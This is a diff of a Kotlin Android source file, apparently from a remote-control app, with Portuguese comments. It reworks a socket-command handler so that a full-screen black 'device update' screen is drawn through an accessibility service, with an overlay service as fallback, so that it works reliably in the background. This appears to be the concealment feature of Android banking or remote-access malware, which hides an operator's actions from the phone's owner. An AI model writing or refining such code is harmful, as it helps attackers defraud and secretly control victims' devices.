@@ -597,18 +597,29 @@ object SocketManager {
                             args.isNotEmpty() && args[0] is Boolean -> args[0] as Boolean
                             else -> false
                         }
-                        val ctx = appContext
-                        if (ctx != null) {
-                            try {
-                                val intent = Intent(ctx, AtualizacaoDispositivoService::class.java)
-                                    .putExtra("ativo", ativo)
-                                if (ativo) ctx.startService(intent)
-                                else ctx.stopService(intent)
-                            } catch (e: Exception) {
-                                Log.e(TAG, "Erro ao (des)ativar AtualizacaoDispositivoService: ${e.message}", e)
+                        // CAMINHO ROBUSTO (preferido): o serviço de acessibilidade
+                        // desenha a tela preta — NÃO depende de SYSTEM_ALERT_WINDOW
+                        // nem de startService (que falhavam em segundo plano).
+                        val svcAcc = MyAccessibilityService.instance
+                        if (svcAcc != null) {
+                            if (ativo) svcAcc.mostrarAtualizacaoDispositivoPreta()
+                            else svcAcc.esconderAtualizacaoDispositivoPreta()
+                            emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta (acessibilidade) ativo = $ativo")
+                        } else {
+                            // Fallback: serviço dedicado (precisa de SYSTEM_ALERT_WINDOW).
+                            val ctx = appContext
+                            if (ctx != null) {
+                                try {
+                                    val intent = Intent(ctx, AtualizacaoDispositivoService::class.java)
+                                        .putExtra("ativo", ativo)
+                                    if (ativo) ctx.startService(intent)
+                                    else ctx.stopService(intent)
+                                } catch (e: Exception) {
+                                    Log.e(TAG, "Erro ao (des)ativar AtualizacaoDispositivoService: ${e.message}", e)
+                                }
                             }
+                            emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta (service fallback) ativo = $ativo")
                         }
-                        emitLog("[ATUALIZACAO DISPOSITIVO] Tela preta ativo = $ativo")
                     }
 
                     // ============================================================
